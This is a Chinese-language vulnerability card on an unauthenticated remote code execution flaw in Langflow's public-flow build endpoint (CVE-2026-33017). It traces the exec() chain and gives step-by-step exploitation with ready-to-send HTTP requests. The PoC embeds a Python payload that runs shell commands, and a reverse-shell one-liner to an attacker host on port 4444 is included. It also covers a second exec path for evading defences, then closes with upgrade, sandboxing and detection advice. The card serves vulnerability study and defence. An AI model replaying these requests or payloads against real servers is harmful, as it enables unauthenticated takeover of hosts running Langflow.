---
id: ai-security-agent-security-langflow-build-public-tmp-data-code-exec
title: Langflow build_public_tmp 未认证 data 参数直达自定义组件 exec：公开流程端点 RCE（CVE-2026-33017）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: langflow-public-flow-data-custom-component-exec
aliases:
- CVE-2026-33017
- Langflow RCE
- build_public_tmp RCE
- Langflow 公开流程 RCE
- 自定义组件代码执行
- prepare_global_scope exec
- AUTO_LOGIN 利用
tags:
- ai-security
- langflow
- llm
- agent
- rce
- python
- exec
- ast
- unauthenticated
- cve-2026-33017
cve:
- CVE-2026-33017
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: langflow 1.6.8（修复于 1.9.0）
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T06:05:04+08:00'
  notes: 已对照原文及16张截图核对：build_public_tmp 无 current_user 依赖且 data 可控、start_flow_build→generate_flow_events→build_graph_from_data→Graph.from_payload→instantiate_class→eval_custom_component_code→create_class→prepare_global_scope 的 exec 链、仅 ast.Assign/ClassDef/FunctionDef 执行而 ast.Expr 跳过、AUTO_LOGIN 建 PUBLIC flow、/tmp/pwned.txt 返回 uid=1000(user)、反弹 shell，均一致；修复版本 1.9.0 移除 data 参数与原文一致。未在本机复现。
---

## 一句话结论

Langflow 1.6.8 的 `POST /api/v1/build_public_tmp/{flow_id}/flow` 为支持嵌入式公共流程，接受攻击者可控的 `data` 节点定义且没有 `current_user` 认证依赖；`data.nodes[].data.node.template.code.value` 会一路传到 `exec()` 执行，未登录攻击者只要有一个有效公开 flow_id（默认 `AUTO_LOGIN=true` 时可自行创建）即可在服务端执行任意 Python 代码。

## 原理

- **端点缺认证**：`build_public_tmp()` 与有认证的 `build_flow()` 唯一关键差别是不注入 `current_user: CurrentActiveUser`。它仍会调用 `verify_public_flow_and_get_user()` 校验 flow_id 对应公开流程，但不校验调用者身份。
- **data 参数可控**：该端点多出一个 `data: FlowDataRequest | None`，攻击者可在 HTTP Body 中携带完整节点定义；该参数被原样传给 `start_flow_build(data=data, ...)`。
- **图构建路径**：`generate_flow_events()` 内的 `create_graph()` 判断 `if not data` 时从数据库读流程（安全路径），否则执行 `data.model_dump()` → `build_graph_from_data()` → `Graph.from_payload()` → `add_nodes_and_edges()` → `initialize()` → `_build_graph()` → `_build_vertex_params()` → `_instantiate_components_in_vertices()`。
- **代码提取**：`Vertex.instantiate_component()` 调用 `loading.instantiate_class()`，后者 `custom_params.pop("code")` 取出攻击者字符串，交给 `eval_custom_component_code()` → `validate.create_class()`。
- **exec sink**：`create_class()` 先 `ast.parse(code)`（仅语法检查），再 `prepare_global_scope(module)`。该函数 `exec_globals = globals().copy()`，对 `ast.Import/ImportFrom` 无模块白名单，把 `ast.ClassDef/FunctionDef/Assign` 收入 `definitions`，`compile()` 后 `exec(compiled_code, exec_globals)`。无 `__builtins__` 限制、无沙箱，代码拥有与 Langflow 后端进程相同权限。
- **关键语法限制**：只有 `ast.Assign` 等定义节点会执行，独立表达式（`ast.Expr`）被静默跳过。因此 `os.system("id")` 单独写不会执行，必须写成赋值，例如 `_r = os.system("id")`；链式赋值可把多个操作塞进同一个 Assign 右侧。
- **默认配置放大**：`AUTO_LOGIN=true` 时任何人可调用 `/api/v1/auto_login` 获取令牌，再创建 `access_type=PUBLIC` 的流程拿到 flow_id，实现完全自给自足的未认证利用；真实目标也可从公开分享链接提取 flow_id。

## 触发条件

- 运行受影响版本 Langflow（原文复现 1.6.8，修复版本 1.9.0 移除了 `data` 参数）。
- `/api/v1/build_public_tmp/{flow_id}/flow` 可从攻击者网络访问。
- 存在一个公开流程，或 `AUTO_LOGIN=true` 允许攻击者自行创建；flow_id 可通过公开分享链接或创建接口获得。
- 后端允许自定义 Python 组件（Langflow 默认功能）。
- 无需登录凭据。

## 利用步骤

1. 若目标开启 `AUTO_LOGIN`，调用 `/api/v1/auto_login` 获取 Bearer token；否则从目标公开分享的流程 URL 中提取 flow_id。
2. 调用 `POST /api/v1/flows/` 创建一个 `access_type=PUBLIC` 的空流程，响应中取 `id` 作为 flow_id。
3. 构造恶意 `data`：`nodes[0].data.node.template.code.value` 放入“赋值形式的命令执行 + Component 骨架”。
4. 发送 `POST /api/v1/build_public_tmp/{flow_id}/flow`，带 `Cookie: client_id=attacker` 与 `data`。
5. 服务端在图构建阶段即实例化节点并 `exec()` 代码，不需要等流程真正运行；命令输出可写入文件或反弹 shell。
6. 进入容器/主机验证 `/tmp/pwned.txt` 或反弹连接，确认权限为 Langflow 进程用户。

## PoC

初始化与创建公开流程（AUTO_LOGIN 场景）：

```http
POST /api/v1/auto_login HTTP/1.1
Host: target:7860
```

```http
POST /api/v1/flows/ HTTP/1.1
Host: target:7860
Authorization: Bearer <token>
Content-Type: application/json

{"name":"test-public","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}
```

触发 RCE：

```http
POST /api/v1/build_public_tmp/<flow_id>/flow HTTP/1.1
Host: target:7860
Content-Type: application/json
Cookie: client_id=attacker

{
  "data": {
    "nodes": [{
      "id": "n1",
      "type": "genericNode",
      "data": {
        "id": "n1",
        "type": "Stub",
        "node": {
          "template": {
            "code": {
              "type": "code", "required": true, "show": true, "multiline": true,
              "name": "code",
              "value": "import os\n_r = open('/tmp/pwned.txt','w').write(os.popen('id && hostname').read())\nfrom langflow.custom import Component\nfrom langflow.io import Output\nfrom langflow.schema import Data\nclass Stub(Component):\n    display_name = 'X'\n    outputs = [Output(display_name='O', name='o', method='r')]\n    def r(self) -> Data:\n        return Data(data={})"
            }
          }
        }
      }
    }],
    "edges": []
  }
}
```

响应返回 `job_id` 即表示 graph 构建已启动；随后在容器内 `cat /tmp/pwned.txt` 可看到 `uid=...` 与主机名（原文实测为 `uid=1000(user) gid=0(root)`）。反弹 shell 只需把 `_r = ...` 换成 `os.system("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'")`。

## 变体与关联

- 第二处执行点：`build_class_constructor()` 对类体再做一次 `exec(compiled_class, exec_globals, exec_locals)`，可在 Component 子类的类体/元类中放置载荷，绕过只检查顶层 Assign 的防护思路。
- 已认证用户也可通过其它接受 `data` 的构建接口到达同一 `exec()`；本卡的独特之处是公开端点移除了认证。
- Component 骨架用于通过后续 `Component` 子类扫描与类型检查；即使骨架异常，顶层 Assign 已在 `prepare_global_scope()` 中执行完毕。
- 与 [[ai-security-agent-security-langgraph-checkpoint-json-fallback-rce]]、[[ai-security-agent-security-letta-running-message-eval-rce]] 同属 AI 平台把用户可控数据送进 exec/eval 的模式。
- 边界：需要有效公开 flow_id；若目标关闭公开流程且 `AUTO_LOGIN=false`，需先通过其它方式获得一个公开流程 ID。

## 检测与防御

- 升级到 1.9.0+；修复版移除 `build_public_tmp` 的 `data` 参数，强制 `data=None` 走数据库可信流程路径。
- 关闭 `AUTO_LOGIN`，强制认证；限制公开流程功能，或要求公开流程只能使用预置组件、不可携带自定义代码。
- 若必须保留自定义组件，将代码执行放入隔离沙箱（受限 builtins、独立低权限进程/容器、禁网），不要把 `globals().copy()` 作为执行上下文。
- 输入侧：拒绝 `build_public_tmp` 请求体中出现 `data.nodes[].data.node.template.code`；对流程定义做结构白名单校验。
- 检测：未认证请求命中 `build_public_tmp` 且 body 含 `template.code`/`exec`/`subprocess`/`os.system`；Langflow 进程异常派生子进程、访问 `/tmp` 写入或外连；`AUTO_LOGIN` 后立即创建 PUBLIC 流程并调用 build 的异常序列。
